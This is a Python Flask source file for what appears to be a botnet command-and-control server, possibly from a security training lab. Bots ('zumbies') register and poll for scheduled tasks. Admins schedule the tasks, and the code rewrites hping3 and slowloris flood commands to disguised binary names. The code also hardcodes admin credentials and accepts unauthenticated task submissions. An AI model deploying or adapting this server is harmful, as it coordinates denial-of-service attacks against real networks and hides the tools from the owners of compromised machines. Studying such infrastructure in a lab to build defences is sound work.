from flask import Flask, request, session, url_for, redirect, render_template
from functools import wraps
import os
import datetime
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', type=int, default=5000)
parser.add_argument('-H', '--host', type=str, default="0.0.0.0")
args = parser.parse_args()

app = Flask(__name__, static_url_path='/s', static_folder='static')
app.secret_key = os.urandom(12)

zumbies = {}
tasks = {}


def check_auth(user, passwd):
    return user == "admin" and passwd == "hackinsdn"


def login_required(f):
    @wraps(f)
    def wrapped_view(**kwargs):
        auth = request.authorization
        if not (auth and check_auth(auth.username, auth.password)):
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="Login Required"'
            })
        session["is_authenticated"] = True

        return f(**kwargs)

    return wrapped_view


@app.route("/")
def get_home():
    return render_template("index.html")


@app.route("/admin", methods=["GET"])
@login_required
def get_admin():
    now = datetime.datetime.now().timestamp()
    return render_template("admin.html", zumbies=zumbies, tasks=tasks, now=now)


@app.route("/register", methods=["POST"])
def register_zumbi():
    global zumbies
    zumbies[request.remote_addr] = {}
    zumbies[request.remote_addr]["_info"] = request.get_json()
    zumbies[request.remote_addr]["_tasks"] = {}
    return "OK"


@app.route("/zumbies", methods=["GET"])
def get_zumbies():
    global zumbies
    return zumbies, 200


@app.route("/new_task", methods=["POST"])
def new_task():
    global tasks
    if "is_authenticated" in session:
        data = dict(request.form)
    else:
        data = request.get_json()
    now = datetime.datetime.now().timestamp()
    try:
        if data["when"].isdigit():
            when = now + int(data["when"])
        else:
            when = datetime.datetime.strptime(data["when"], "%Y-%m-%d,%H:%M:%S").replace(tzinfo=datetime.timezone.utc).timestamp()
    except:
        return "Invalid 'when' attribute. Format: YYYY-MM-DD,HH:MM:SS (UTC) or S (number of seconds from now)", 400
    if when < now + 90:
        return "Invalid 'when' attribute: must be at least 90s from now", 400
    if when in tasks:
        return "Cannot add two tasks at the same time", 400
    tasks[when] = data["task"].replace("hping3", "/usr/bin/linux_checker").replace("slowloris", "/usr/bin/linux_verify")
    if "is_authenticated" in session:
        return redirect(url_for('get_admin'))
    return "OK"


@app.route("/get_tasks", methods=["GET"])
def get_tasks():
    global zumbies, tasks
    next_tasks = []
    now = datetime.datetime.now().timestamp()
    zumbi = zumbies.get(request.remote_addr)
    if not zumbi:
        zumbies[request.remote_addr] = {"_tasks": {}, "_info": {}}
        zumbi = zumbies[request.remote_addr]
    for when, task in tasks.items():
        if when < now + 10:
            zumbi["_tasks"].pop(when, None)
            continue
        if when in zumbi["_tasks"]:
            continue
        next_tasks.append(f"{when - now};{task}")
        zumbi["_tasks"][when] = True
    return "\n".join(next_tasks), 200


if __name__ == "__main__":
    app.run(host=args.host, port=args.port)
